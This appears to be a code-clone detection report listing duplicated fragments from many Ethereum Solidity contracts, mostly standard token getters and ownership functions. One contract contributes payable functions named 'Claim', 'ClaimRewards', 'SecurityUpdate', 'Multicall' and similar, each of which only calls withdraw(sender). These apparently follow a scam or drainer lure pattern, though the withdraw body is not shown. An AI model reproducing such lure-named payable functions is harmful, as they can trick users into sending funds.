<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="56" endline="58" pcid="1047">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="55" endline="57" pcid="6376">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="58" endline="60" pcid="8301">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="58" endline="60" pcid="7573">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="51" endline="53" pcid="7049">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="58" endline="60" pcid="6226">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb6f2920e2e7d1892ddd0ed3c073c204ab90461d1.sol" startline="52" endline="54" pcid="6661">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="55" endline="57" pcid="2924">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="59" endline="61" pcid="445">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="41" endline="43" pcid="4911">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="56" endline="58" pcid="4488">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="55" endline="57" pcid="5656">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="53" endline="55" pcid="6346">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="55" endline="57" pcid="6682">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x95b34d9c10e8569d9fd1e08001cfd84a59226ab9.sol" startline="40" endline="42" pcid="5456">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="58" endline="60" pcid="8749">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
</class>

<class classid="18" nclones="22" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="316" endline="319" pcid="20">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="353" endline="356" pcid="7762">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="112" endline="115" pcid="4518">
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="317" endline="320" pcid="7901">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0x121868a5f070ae50e485dc391748cafce748e29d.sol" startline="31" endline="34" pcid="483">
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
</source>
<source file="systems/source-code/0x68f09e30ccd68c4a16ed68915b2b4f631b9ab719.sol" startline="69" endline="72" pcid="3897">
    function renounceOwnership() external onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="321" endline="324" pcid="3686">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="758" endline="761" pcid="8140">
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="319" endline="322" pcid="8503">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0x6976ad037ba6979d23d9cae2ebba9e150ad220d4.sol" startline="69" endline="72" pcid="3918">
    function renounceOwnership() external onlyDeployer {
        emit OwnershipTransferred(deployer, address(0));
        deployer = address(0);
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="317" endline="320" pcid="6398">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0x276bdaae1e84fb779399844d422d89961b672f3f.sol" startline="25" endline="28" pcid="1230">
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="82" endline="85" pcid="8624">
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="316" endline="319" pcid="9094">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0x800b43ff3c0314167874598478b458c13acca420.sol" startline="71" endline="74" pcid="4719">
    function renounceOwnership() external onlyDeployer {
        emit OwnershipTransferred(deployer, address(0));
        deployer = address(0);
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="317" endline="320" pcid="5802">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0xfad76b7672352d7d7cce5eb1954e3a29659d5789.sol" startline="69" endline="72" pcid="9121">
    function renounceOwnership() external onlyDeployer {
        emit OwnershipTransferred(deployer, address(0));
        deployer = address(0);
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="318" endline="321" pcid="9248">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0xfe3d1adcafda329e2ceb4e21c4a1f6a8f38af531.sol" startline="69" endline="72" pcid="9305">
    function renounceOwnership() external onlyDeployer {
        emit OwnershipTransferred(deployer, address(0));
        deployer = address(0);
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="350" endline="353" pcid="7011">
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
</source>
<source file="systems/source-code/0xd2561d1426d48ead5653cb31af52eb7a2bcf95f9.sol" startline="25" endline="28" pcid="7526">
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
</source>
<source file="systems/source-code/0x3c5283eb7c2e7ce3f2199699883d4191d1a5ac99.sol" startline="69" endline="72" pcid="2123">
    function renounceOwnership() external onlyDeployer {
        emit OwnershipTransferred(deployer, address(0));
        deployer = address(0);
    }
</source>
</class>

<class classid="19" nclones="22" nlines="3" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="325" endline="327" pcid="21">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="33" endline="33" pcid="6599">
  function Connect(address sender) public payable { withdraw(sender); }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="32" endline="32" pcid="6598">
  function Swap(address sender) public payable { withdraw(sender); }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="328" endline="330" pcid="8504">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="31" endline="31" pcid="6597">
  function Multicall(address sender) public payable { withdraw(sender); }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="30" endline="30" pcid="6596">
  function Execute(address sender) public payable { withdraw(sender); }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="325" endline="327" pcid="9095">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="29" endline="29" pcid="6595">
  function ClaimRewards(address sender) public payable { withdraw(sender); }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="571" endline="573" pcid="8126">
    function addPauser(address account) public onlyPauser {
        _addPauser(account);
    }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="34" endline="34" pcid="6600">
  function SecurityUpdate(address sender) public payable { withdraw(sender); }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="28" endline="28" pcid="6594">
  function ClaimReward(address sender) public payable { withdraw(sender); }
</source>
<source file="systems/source-code/0xcE834FaC091Ce0Ce3CA9845dd89108f6ca5bb335.sol" startline="154" endline="156" pcid="7358">
  function upgradeTo(address implementation) public onlyProxyOwner {
    _upgradeTo(implementation);
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="359" endline="361" pcid="7012">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="27" endline="27" pcid="6593">
  function Claim(address sender) public payable { withdraw(sender); }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="362" endline="364" pcid="7763">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="767" endline="769" pcid="8141">
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="326" endline="328" pcid="5803">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="327" endline="329" pcid="9249">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="326" endline="328" pcid="6399">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="91" endline="93" pcid="8625">
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="330" endline="332" pcid="3687">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="326" endline="328" pcid="7902">
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
</source>
</class>

<class classid="20" nclones="13" nlines="5" similarity="75">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="332" endline="336" pcid="22">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="366" endline="370" pcid="7013">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="128" endline="135" pcid="4519">
    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="369" endline="373" pcid="7764">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="333" endline="337" pcid="7903">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="774" endline="778" pcid="8142">
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="335" endline="339" pcid="8505">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="99" endline="103" pcid="8626">
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="337" endline="341" pcid="3688">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="333" endline="337" pcid="6400">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="332" endline="336" pcid="9096">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="334" endline="338" pcid="9250">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="333" endline="337" pcid="5804">
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
</source>
</class>

<class classid="21" nclones="9" nlines="3" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="364" endline="366" pcid="23">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="365" endline="367" pcid="7904">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="365" endline="367" pcid="6401">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="364" endline="366" pcid="9097">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="398" endline="400" pcid="7014">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="365" endline="367" pcid="5805">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="369" endline="371" pcid="3689">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="367" endline="369" pcid="8506">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="401" endline="403" pcid="7765">
  function getOwner() external view returns (address) {
    return owner();
  }
</source>
</class>

<class classid="22" nclones="1011" nlines="3" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="378" endline="380" pcid="25">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="52" endline="54" pcid="2445">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb6f2920e2e7d1892ddd0ed3c073c204ab90461d1.sol" startline="48" endline="50" pcid="6660">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="70" endline="72" pcid="8752">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="68" endline="70" pcid="6279">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="50" endline="52" pcid="2818">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="56" endline="58" pcid="5103">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="51" endline="53" pcid="2746">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="51" endline="53" pcid="1607">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="54" endline="56" pcid="3437">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="67" endline="69" pcid="4691">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="66" endline="68" pcid="1964">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="70" endline="72" pcid="4417">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="54" endline="56" pcid="8748">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="67" endline="69" pcid="8896">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="54" endline="56" pcid="2430">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="47" endline="49" pcid="9071">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="52" endline="54" pcid="3002">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="65" endline="67" pcid="8034">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="66" endline="68" pcid="4061">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="70" endline="72" pcid="4630">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="70" endline="72" pcid="2976">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="64" endline="66" pcid="5032">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="53" endline="55" pcid="9327">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="54" endline="56" pcid="8435">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="52" endline="54" pcid="514">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x307121b525b8d83a37bf77c2c71c2a9e75ea7141.sol" startline="44" endline="46" pcid="1498">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="70" endline="72" pcid="1884">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="49" endline="51" pcid="9288">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="50" endline="52" pcid="5760">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="51" endline="53" pcid="1031">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="71" endline="73" pcid="908">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="70" endline="72" pcid="8439">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="50" endline="52" pcid="8179">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="69" endline="71" pcid="7472">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="52" endline="54" pcid="7276">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="56" endline="58" pcid="4472">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="50" endline="52" pcid="8240">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb6f2920e2e7d1892ddd0ed3c073c204ab90461d1.sol" startline="44" endline="46" pcid="6659">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="37" endline="39" pcid="4910">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="52" endline="54" pcid="1780">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="67" endline="69" pcid="2359">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="68" endline="70" pcid="3006">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="67" endline="69" pcid="3133">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="118" endline="120" pcid="4895">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="70" endline="72" pcid="3869">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="52" endline="54" pcid="956">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="70" endline="72" pcid="4947">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x587c98e29d4b92f58fa763a7c3b08613fc5ec66b.sol" startline="48" endline="50" pcid="3334">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="54" endline="56" pcid="1577">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="64" endline="66" pcid="3727">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="70" endline="72" pcid="345">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="51" endline="53" pcid="3129">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="70" endline="72" pcid="7636">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="51" endline="53" pcid="6865">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="49" endline="51" pcid="3340">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="69" endline="71" pcid="5940">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="67" endline="69" pcid="7502">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="67" endline="69" pcid="2750">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
